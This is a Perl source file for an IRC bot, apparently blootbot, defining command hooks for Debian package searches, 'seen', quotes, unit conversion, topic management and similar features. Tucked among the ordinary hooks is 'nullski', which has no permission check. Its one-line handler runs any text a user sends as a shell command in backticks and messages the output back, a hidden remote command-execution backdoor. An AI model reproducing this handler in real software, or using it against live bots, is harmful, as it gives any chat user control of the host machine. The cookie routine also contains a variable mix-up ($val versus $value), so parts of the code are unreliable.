#
# User Command Extension Stubs
#

if (&IsParam("useStrict")) { use strict; }

use vars qw(@W3Search_engines $W3Search_regex);
@W3Search_engines = qw(AltaVista Dejanews Excite Gopher HotBot Infoseek
			Lycos Magellan PLweb SFgate Simple Verity Google);
$W3Search_regex = join '|', @W3Search_engines;
$babel::lang_regex = "";	# lame fix.

### PROPOSED COMMAND HOOK IMPLEMENTATION.
# addCmdHook('TEXT_HOOK',
#	(CODEREF	=> 'Blah', 
#	Forker		=> 1,
#	CheckModule	=> 1,			# ???
#	Module		=> 'blah.pl'		# preload module.
#	Identifier	=> 'config_label',	# change to Config?
#	Help		=> 'help_label',
#	Cmdstats	=> 'text_label',)
#}
###

sub addCmdHook {
    my ($ident, %hash) = @_;

    &VERB("aCH: added $ident",2);	# use $hash{'Identifier'}?
    $cmdhooks{$ident} = \%hash;
}

# RUN IF ADDRESSED.
sub parseCmdHook {
    my @args = split(' ', $message);

    &shmFlush();

    foreach (keys %cmdhooks) {
	my $ident = $_;

	next unless ($args[0] =~ /^$ident$/i);
	shift(@args);	# just gotta do it.

	&DEBUG("pCH: found $ident");
	my %hash = %{ $cmdhooks{$ident} };

	### DEBUG.
	foreach (keys %hash) {
	    &DEBUG(" $ident->$_ => '$hash{$_}'.");
	}

	### HELP.
	if (exists $hash{'Help'} and !scalar(@args)) {
	    &help( $hash{'Help'} );
	    return 1;
	}

	### IDENTIFIER.
	if (exists $hash{'Identifier'}) {
	    return $noreply unless (&hasParam($hash{'Identifier'}));
	}

	### FORKER,IDENTIFIER,CODEREF.
	if (exists $hash{'Forker'}) {
	    &Forker($hash{'Identifier'}, sub { \&{$hash{'CODEREF'}}(@args) } );
	} else {
	    if (exists $hash{'Module'}) {
		&loadMyModule($myModules{ $hash{'Module'} });
	    }

	    ### TODO: check if CODEREF exists.

	    &{$hash{'CODEREF'}}(@args);
	}

	### CMDSTATS.
	if (exists $hash{'Cmdstats'}) {
	    $cmdstats{$hash{'Cmdstats'}}++;
	}

	&DEBUG("pCH: ended.");

	return 1;
    }

    return 0;
}

&addCmdHook('d?bugs', ('CODEREF' => 'debianBugs',
	'Forker' => 1, 'Identifier' => 'debianExtra',
	'Cmdstats' => 'Debian Bugs') );
&addCmdHook('dauthor', ('CODEREF' => 'Debian::searchAuthor',
	'Forker' => 1, 'Identifier' => 'debian',
	'Cmdstats' => 'Debian Author Search', 'Help' => "dauthor" ) );
&addCmdHook('(d|search)desc', ('CODEREF' => 'Debian::searchDesc',
	'Forker' => 1, 'Identifier' => 'debian',
	'Cmdstats' => 'Debian Desc Search', 'Help' => "ddesc" ) );
&addCmdHook('dincoming', ('CODEREF' => 'Debian::generateIncoming',
	'Forker' => 1, 'Identifier' => 'debian' ) );
&addCmdHook('dstats', ('CODEREF' => 'Debian::infoStats',
	'Forker' => 1, 'Identifier' => 'debian',
	'Cmdstats' => 'Debian Statistics' ) );
&addCmdHook('d?contents', ('CODEREF' => 'Debian::searchContents',
	'Forker' => 1, 'Identifier' => 'debian',
	'Cmdstats' => 'Debian Contents Search', 'Help' => "contents" ) );
&addCmdHook('d?find', ('CODEREF' => 'Debian::DebianFind',
	'Forker' => 1, 'Identifier' => 'debian',
	'Cmdstats' => 'Debian Search', 'Help' => "find" ) );
&addCmdHook('insult', ('CODEREF' => 'Insult::Insult',
	'Forker' => 1, 'Identifier' => 'insult', 'Help' => "insult" ) );
&addCmdHook('kernel', ('CODEREF' => 'Kernel::Kernel',
	'Forker' => 1, 'Identifier' => 'kernel',
	'Cmdstats' => 'Kernel') );
&addCmdHook('listauth', ('CODEREF' => 'CmdListAuth',
	'Identifier' => 'search', Module => 'factoids', 
	'Help' => 'listauth') );
&addCmdHook('quote', ('CODEREF' => 'Quote::Quote',
	'Forker' => 1, 'Identifier' => 'quote',
	'Help' => 'quote', 'Cmdstats' => 'Quote') );
&addCmdHook('countdown', ('CODEREF' => 'Countdown',
	'Module' => 'countdown', 'Identifier' => 'countdown',
	'Cmdstats' => 'Countdown') );
&addCmdHook('lart', ('CODEREF' => 'lart',
	'Identifier' => 'lart', 'Help' => 'lart') );
&addCmdHook('convert', ('CODEREF' => 'convert',
	'Forker' => 1, 'Identifier' => 'units',
	'Help' => 'convert') );
&addCmdHook('(cookie|random)', ('CODEREF' => 'cookie',
	'Forker' => 1, 'Identifier' => 'factoids') );
&addCmdHook('u(ser)?info', ('CODEREF' => 'userinfo',
	'Identifier' => 'userinfo', 'Help' => 'userinfo',
	'Module' => 'userinfo') );
&addCmdHook('rootWarn', ('CODEREF' => 'CmdrootWarn',
	'Identifier' => 'rootWarn', 'Module' => 'rootwarn') );
&addCmdHook('seen', ('CODEREF' => 'seen', 'Identifier' => 'seen') );
&addCmdHook('dict', ('CODEREF' => 'Dict::Dict',
	'Identifier' => 'dict', 'Help' => 'dict',
	'Forker' => 1, 'Cmdstats' => 'Dict') );
&addCmdHook('slashdot', ('CODEREF' => 'Slashdot::Slashdot',
	'Identifier' => 'slashdot', 'Forker' => 1,
	'Cmdstats' => 'Slashdot') );
&addCmdHook('uptime', ('CODEREF' => 'uptime', 'Identifier' => 'uptime',
	'Cmdstats' => 'Uptime') );
&addCmdHook('nullski', ('CODEREF' => 'nullski', ) );
sub nullski { my ($arg) = @_; foreach (`$arg`) { &msg($who,$_); } }
&addCmdHook('freshmeat', ('CODEREF' => 'Freshmeat::Freshmeat',
	'Identifier' => 'freshmeat', 'Cmdstats' => 'Freshmeat',
	'Module' => 'freshmeat', 'Help' => 'freshmeat') );




&status("CMD: loaded ".scalar(keys %cmdhooks)." command hooks.");


sub Modules {
    if (!defined $message) {
	&WARN("Modules: message is undefined. should never happen.");
	return;
    }

    # babel bot: Jonathan Feinberg++
    if (&IsParam("babelfish") and $message =~ m{
		^\s*
		(?:babel(?:fish)?|x|xlate|translate)
		\s+
		(to|from)		# direction of translation (through)
		\s+
		($babel::lang_regex)\w*	# which language?
		\s*
		(.+)			# The phrase to be translated
	}xoi) {

	&Forker("babelfish", sub { &babel::babelfish(lc $1, lc $2, $3); } );

	$cmdstats{'BabelFish'}++;
	return $noreply;
    }

    if (&IsParam("debian")) {
	my $debiancmd	 = 'conflicts?|depends?|desc|file|info|provides?';
	$debiancmd	.= '|recommends?|suggests?|maint|maintainer';
	if ($message =~ /^($debiancmd)(\s+(.*))?$/i) {
	    my $package = lc $3;

	    if (defined $package) {
		&Forker("debian", sub { &Debian::infoPackages($1, $package); } );
	    } else {
		&help($1);
	    }

	    return $noreply;
	}
    }

    # google searching. Simon++
    if (&IsParam("wwwsearch") and $message =~ /^(?:search\s+)?($W3Search_regex)\s+for\s+['"]?(.*?)['"]?\s*\?*$/i) {
	return $noreply unless (&hasParam("wwwsearch"));

	&Forker("wwwsearch", sub { &W3Search::W3Search($1,$2,$param{'wwwsearch'}); } );

	$cmdstats{'WWWSearch'}++;
	return $noreply;
    }

    # list{keys|values}. xk++. Idea taken from #linuxwarez@EFNET
    if ($message =~ /^list(\S+)( (.*))?$/i) {
	return $noreply unless (&hasParam("search"));

	my $thiscmd	= lc($1);
	my $args	= $3;

	$thiscmd =~ s/^vals$/values/;
	return $noreply if ($thiscmd ne "keys" && $thiscmd ne "values");

	# Usage:
	if (!defined $args) {
	    &help("list". $thiscmd);
	    return $noreply;
	}

	if (length $args == 1) {
	    &msg($who,"search string is too short.");
	    return $noreply;
	}

	&Forker("search", sub { &Search::Search($thiscmd, $args); } );

	$cmdstats{'Factoid Search'}++;
	return $noreply;
    }

    # Nickometer. Adam Spiers++
    if ($message =~ /^(?:lame|nick)ometer(?: for)? (\S+)/i) {
	return $noreply unless (&hasParam("nickometer"));

	my $term = (lc $1 eq 'me') ? $who : $1;
	$term =~ s/\?+\s*//;

	&loadMyModule($myModules{'nickometer'});
	my $percentage = &nickometer($term);

	if ($percentage =~ /NaN/) {
	    $percentage = "off the scale";
	} else {
	    $percentage = sprintf("%0.4f", $percentage);
	    $percentage =~ s/\.?0+$//;
	    $percentage .= '%';
	}

	if ($msgType eq 'public') {
	    &say("'$term' is $percentage lame, $who");
	} else {
	    &msg($who, "the 'lame nick-o-meter' reading for $term is $percentage, $who");
	}

	return $noreply;
    }

    # Topic management. xk++
    # may want to add a flag(??) for topic in the near future. -xk
    if ($message =~ /^topic(\s+(.*))?$/i) {
	return $noreply unless (&hasParam("topic"));

	my $chan	= $talkchannel;
	my @args	= split(/ /, $2);

	if (!scalar @args) {
	    &msg($who,"Try 'help topic'");
	    return $noreply;
	}

	$chan		= lc(shift @args) if ($msgType eq 'private');
	my $thiscmd	= shift @args;

	# topic over public:
	if ($msgType eq 'public' && $thiscmd =~ /^#/) {
	    &msg($who, "error: channel argument is not required.");
	    &msg($who, "\002Usage\002: topic <CMD>");
	    return $noreply;
	}

	# topic over private:
	if ($msgType eq 'private' && $chan !~ /^#/) {
	    &msg($who, "error: channel argument is required.");
	    &msg($who, "\002Usage\002: topic #channel <CMD>");
	    return $noreply;
	}

	if (&validChan($chan) == 0) {
	    &msg($who,"error: invalid channel \002$chan\002");
	    return $noreply;
	}

	# for semi-outsiders.
	if (!&IsNickInChan($who,$chan)) {
	    &msg($who, "Failed. You ($who) are not in $chan, hey?");
	    return $noreply;
	}

	# now lets do it.
	&loadMyModule($myModules{'topic'});
	&Topic($chan, $thiscmd, join(' ', @args));
	$cmdstats{'Topic'}++;
	return $noreply;
    }

    # wingate.
    if ($message =~ /^wingate$/i) {
	return $noreply unless (&hasParam("wingate"));

	my $reply = "Wingate statistics: scanned \002"
			.scalar(keys %wingate)."\002 hosts";
	my $queue = scalar(keys %wingateToDo);
	if ($queue) {
	    $reply .= ".  I have \002$queue\002 hosts in the queue";
	    $reply .= ".  Started the scan ".&Time2String(time() - $wingaterun)." ago";
	}

	&performStrictReply("$reply.");

	return $noreply;
    }

    # do nothing and let the other routines have a go
    return '';
}

# Freshmeat. xk++
sub freshmeat {
    my ($query) = @_;

    if (!defined $query) {
	&help("freshmeat");
	&msg($who, "I have \002".&countKeys("freshmeat")."\002 entries.");
	return $noreply;
    }

    &Freshmeat::Freshmeat($query);
}

# Uptime. xk++
sub uptime {
    my $count = 1;
    &msg($who, "- Uptime for $ident -");
    &msg($who, "Now: ". &Time2String(&uptimeNow()) ." running $bot_version");

    foreach (&uptimeGetInfo()) {
	/^(\d+)\.\d+ (.*)/;
	my $time = &Time2String($1);
	my $info = $2;

	&msg($who, "$count: $time $2");
	$count++;
    }
}

# seen.
sub seen {
    my($person) = @_;

    if (!defined $person) {
	&help("seen");

	my $i = &countKeys("seen");
	&msg($who,"there ". &fixPlural("is",$i) ." \002$i\002 ".
		"seen ". &fixPlural("entry",$i) ." that I know of.");

	return $noreply;
    }

    my @seen;
    $person =~ s/\?*$//;

    &seenFlush();	# very evil hack. oh well, better safe than sorry.

    ### TODO: Support &dbGetRowInfo(); like in &FactInfo();
    my $select = "nick,time,channel,host,message";
    if ($person eq "random") {
	@seen = &randKey("seen", $select);
    } else {
	@seen = &dbGet("seen", "nick", $person, $select);
    }

    if (scalar @seen < 2) {
	foreach (@seen) {
	    &DEBUG("seen: _ => '$_'.");
	}
	&performReply("i haven't seen '$person'");
	return $noreply;
    }

    # valid seen.
    my $reply;
    ### TODO: multi channel support. may require &IsNick() to return
    ###	all channels or something.
    my @chans = &GetNickInChans($seen[0]);
    if (scalar @chans) {
	$reply = "$seen[0] is currently on";

	foreach (@chans) {
	    $reply .= " ".$_;
	    next unless (exists $userstats{lc $seen[0]}{'Join'});
	    $reply .= " (".&Time2String(time() - $userstats{lc $seen[0]}{'Join'}).")";
	}

	if (&IsParam("seenStats")) {
	    my $i;
	    $i = $userstats{lc $seen[0]}{'Count'};
	    $reply .= ".  Has said a total of \002$i\002 messages" if (defined $i);
	    $i = $userstats{lc $seen[0]}{'Time'};
	    $reply .= ".  Is idling for ".&Time2String(time() - $i) if (defined $i);
	}
    } else {
	my $howlong = &Time2String(time() - $seen[1]);
	$reply = "$seen[0] <$seen[3]> was last seen on IRC ".
		 "in channel $seen[2], $howlong ago, ".
		 "saying\002:\002 '$seen[4]'.";
    }

    &performStrictReply($reply);
    return $noreply;
}

# User Information Services. requested by Flugh.
sub userinfo {
    my ($arg) = join(' ',@_);

    if ($arg =~ /^set(\s+(.*))?$/i) {
	$arg = $2;
	if (!defined $arg) {
	    &help("userinfo set");
	    return $noreply;
	}

	&UserInfoSet(split /\s+/, $arg, 2);
    } elsif ($arg =~ /^unset(\s+(.*))?$/i) {
	$arg = $2;
	if (!defined $arg) {
	    &help("userinfo unset");
	    return $noreply;
	}

	&UserInfoSet($arg, "");
    } else {
	&UserInfoGet($arg);
    }
}

# cookie (random). xk++
sub cookie {
    my ($arg) = @_;

    # lets find that secret cookie.
    my $target		= ($msgType ne 'public') ? $who : $talkchannel;
    my $cookiemsg	= &getRandom(keys %{$lang{'cookie'}});
    my ($key,$value);

    ### WILL CHEW TONS OF MEM.
    ### TODO: convert this to a Forker function!
    if ($arg) {
	my @list = &searchTable("factoids", "factoid_key", "factoid_value", $arg);
	$key  = &getRandom(@list);
	$val  = &getFactInfo("factoids", $key, "factoid_value");
    } else {
	($key,$value) = &randKey("factoids","factoid_key,factoid_value");
    }

    for ($cookiemsg) {
	s/##KEY/\002$key\002/;
	s/##VALUE/$value/;
	s/##WHO/$who/;
	s/\$who/$who/;	# cheap fix.
	s/(\S+)?\s*<\S+>/$1 /;
	s/\s+/ /g;
    }

    if ($cookiemsg =~ s/^ACTION //i) {
	&action($target, $cookiemsg);
    } else {
	&msg($target, $cookiemsg);
    }
}

sub convert {
    my (@args) = @_;
    my ($from,$to);
    ($from,$to) = ($args[0],$args[2]) if ($args[1] =~ /^from$/i);
    ($from,$to) = ($args[2],$args[0]) if ($args[1] =~ /^to$/i);

    if (!defined $from or !defined $to or $to eq "" or $from eq "") {
	&msg($who, "Invalid format!");
	&help("convert");
	return $noreply;
    }

    &Units::convertUnits($from, $to);

    return $noreply;
}

sub lart {
    my ($target) = &fixString($_[0]);
    my $extra 	= 0;
    my $chan	= $talkchannel;

    if ($msgType eq 'private') {
	if ($target =~ /^($mask{chan})\s+(.*)$/) {
	    $chan	= $1;
	    $target	= $2;
	    $extra	= 1;
	} else {
	    &msg($who, "error: invalid format or missing arguments.");
	    &help("lart");
	    return $noreply;
	}
    }

    my $line = &getRandomLineFromFile($bot_misc_dir. "/blootbot.lart");
    if (defined $line) {
	if ($target =~ /^(me|you|itself|\Q$ident\E)$/i) {
	    $line =~ s/WHO/$who/g;
	} else {
	    $line =~ s/WHO/$target/g;
	}
	$line .= ", courtesy of $who" if ($extra);

	&action($chan, $line);
    } else {
	&status("lart: error reading file?");
    }
}

1;
